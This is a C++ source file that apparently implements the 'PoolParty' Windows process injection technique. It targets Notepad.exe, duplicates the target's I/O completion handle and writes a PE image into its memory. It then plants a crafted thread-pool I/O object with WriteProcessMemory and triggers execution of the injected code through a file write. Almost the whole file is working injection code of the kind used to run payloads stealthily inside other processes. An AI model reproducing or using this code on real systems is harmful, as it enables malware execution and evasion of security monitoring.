#include "Misc.hpp"
#include "Native.hpp"
#include "ThreadPool.hpp"
#include "SelfPEInject.hpp"

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define ProcessHandleInformation 51
#define POOL_PARTY_FILE_NAME L"PoolParty.txt"
#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"

HANDLE getProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;

}

int main() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	LPHANDLE pDuplicateHandle = new HANDLE;
	DWORD PID = 0;
	HANDLE hProc = getProcHandlebyName((LPWSTR)L"Notepad.exe", &PID);
	if (!hProc) {
		DEBUG("[x] Cannot open the process\n");
		return -1;
	}

	NTSTATUS ntStatus;
	vector<BYTE> information;
	ULONG returnLength = 0;
	do {
		information.resize(returnLength);
		ntStatus =
			NtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
		//STATUS_INFO_LENGTH_MISMATCH
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandle,
			IO_COMPLETION_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded: %p\n", GetLastError());
			//return -1;
			continue;
		}


		vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*pDuplicateHandle,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		if (wstring(pObjectInformation->TypeName.Buffer) == L"IoCompletion") {
			break;
		}
	}

	LPVOID OEP = WritePEToTarget(hProc);

	SIZE_T byteWritten;
	HANDLE hFile = CreateFile(POOL_PARTY_FILE_NAME,
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		nullptr);
	if (hFile == NULL) {
		DEBUG("[x] CreateFile: %p\n", GetLastError());
		return -1;
	}
	const auto pTpIo = (PFULL_TP_IO)CreateThreadpoolIo(hFile, static_cast<PTP_WIN32_IO_CALLBACK>(OEP), nullptr, nullptr);

	/* Not sure why this field is not filled by CreateThreadpoolIo, need to analyze */
	pTpIo->CleanupGroupMember.Callback = OEP;
	++pTpIo->PendingIrpCount;

	const auto pRemoteTpIo = static_cast<PFULL_TP_IO>(VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (pRemoteTpIo == NULL) {
		DEBUG("[x] VirtualAllocEx failed: %p", GetLastError());
		return -1;
	}
	if (!WriteProcessMemory(hProc, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), &byteWritten)) {
		DEBUG("[x] WriteProcessMemory failed: %p", GetLastError());
		return -1;
	}

	IO_STATUS_BLOCK IoStatusBlock{ 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation{ 0 };

	FileIoCopmletionInformation.Port = *pDuplicateHandle;
	FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;

	ZwSetInformationFilePtr ZwSetInformationFilefn = (ZwSetInformationFilePtr)GetProcAddress(hNtdll, "ZwSetInformationFile");
	ntStatus = ZwSetInformationFilefn(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
	if (!NT_SUCCESS(ntStatus)) {
		DEBUG("[x] ZwSetInformationFilefn failed: %p", ntStatus);
		return -1;
	}

	const std::string Buffer = POOL_PARTY_POEM;
	const auto BufferLength = Buffer.length();
	OVERLAPPED Overlapped{ 0 };
	if (WriteFile(hFile, Buffer.c_str(), BufferLength, nullptr, &Overlapped) == FALSE && GetLastError() != ERROR_IO_PENDING) {
		DEBUG("[x] WriteFile: %p", GetLastError());
		return -1;
	}

}